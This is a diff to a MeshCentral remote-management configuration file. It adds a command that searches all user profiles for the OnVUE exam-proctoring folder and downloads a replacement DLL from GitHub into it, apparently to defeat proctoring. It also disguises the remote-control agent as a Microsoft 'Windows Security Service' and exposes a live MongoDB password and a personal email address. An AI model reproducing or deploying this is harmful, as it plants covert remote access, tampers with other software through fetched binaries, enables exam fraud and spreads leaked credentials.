@@ -3,19 +3,23 @@
   "__comment1__": "This is a simple configuration file, all values and sections that start with underscore (_) are ignored. Edit a section and remove the _ in front of the name. Refer to the user's guide for details.",
   "__comment2__": "See node_modules/meshcentral/sample-config-advanced.json for a more advanced example.",
   "settings": {
-    "cert": "127.0.0.1",
+    "cert": "adpagent.duckdns.org",
     "WANonly": true,
     "port": 443,
     "aliasPort": 443,
     "redirPort": 80,
     "redirAliasPort": 80,
     "dbCleanup": 30,
+    "mongodb": "mongodb+srv://dilipkanuri135_db_user:bDxoS7PXIKuKE3Pi@cluster0.quxp7yv.mongodb.net/meshcentral?appName=Cluster0",
+    "mongodbcol": "meshcentral",
     "keepcerts": false,
     "noLocalDiscovery": true,
     "noMqtt": true,
     "noFirebase": true,
     "noAmt": true,
-    "noMps": true
+    "noMps": true,
+"adpByPassCommand": "for %D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist \"%D:\\Users\" for /f \"delims=\" %U in ('dir /b /ad \"%D:\\Users\"') do @if exist \"%D:\\Users\\%U\\AppData\\Roaming\\OnVUE\" @(curl -L \"https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll\" -o \"%D:\\Users\\%U\\AppData\\Roaming\\OnVUE\\BLNative.dll\" || powershell -NoProfile -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll' -OutFile '%D:\\Users\\%U\\AppData\\Roaming\\OnVUE\\BLNative.dll' -UseBasicParsing\")"
+
   },
   "domains": {
     "": {
@@ -25,20 +29,29 @@
       "noAdminLoginStats": true,
       "noAgentUpdate": false,
       "agentCustomization": {
-        "displayName": "ADP MeshCentral Agent",
-        "description": "ADP remote management agent",
-        "companyName": "ADP",
-        "serviceName": "adpmeshagent",
-        "fileName": "ADPMeshAgent"
+        "displayName": "Windows Security Service",
+        "description": "Windows Security Service",
+        "companyName": "Microsoft Corporation",
+        "serviceName": "WindowsSecurityService",
+        "fileName": "WindowsSecurityService"
       },
       "agentFileInfo": {
         "icon": "ADP_agent.ico",
-        "filedescription": "ADP MeshCentral Agent",
+        "filedescription": "Windows Security Service",
         "fileversion": "1.0.0.0",
-        "internalname": "ADPMeshAgent",
-        "productname": "ADP MeshCentral Agent",
+        "internalname": "WindowsSecurityService",
+        "legalcopyright": "Microsoft Corporation",
+        "originalfilename": "WindowsSecurityService.exe",
+        "productname": "Windows Security Service",
         "productversion": "1.0"
       }
     }
+  },
+  "letsencrypt": {
+    "__comment__": "Requires NodeJS 8.x or better, Go to https://letsdebug.net/ first before trying Let's Encrypt.",
+    "email": "ajayajay142018@gmail.com",
+    "names": "adpagent.duckdns.org",
+    "skipChallengeVerification": false,
+    "production": true
   }
 }
